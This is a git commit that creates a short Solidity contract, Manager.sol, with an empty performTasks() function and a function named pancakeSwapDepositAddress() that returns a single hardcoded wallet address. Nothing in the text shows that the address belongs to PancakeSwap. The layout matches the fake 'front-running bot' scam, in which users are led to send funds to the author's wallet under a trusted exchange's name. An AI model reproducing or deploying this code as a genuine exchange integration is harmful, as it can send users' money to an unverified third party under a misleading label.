f472222ea3a97ed9a1e25e322bd248b53e29d944
pancakeDevs <97230328+pancakeDevs@users.noreply.github.com>
2022-01-06 14:08:04 +0100

    Create Manager.sol

---
+++ Manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeSwapDepositAddress() public pure returns (address) {
+		return 0x435eF4068EC4eC91977dD1171F7659CEd3748067;
+	}
+}
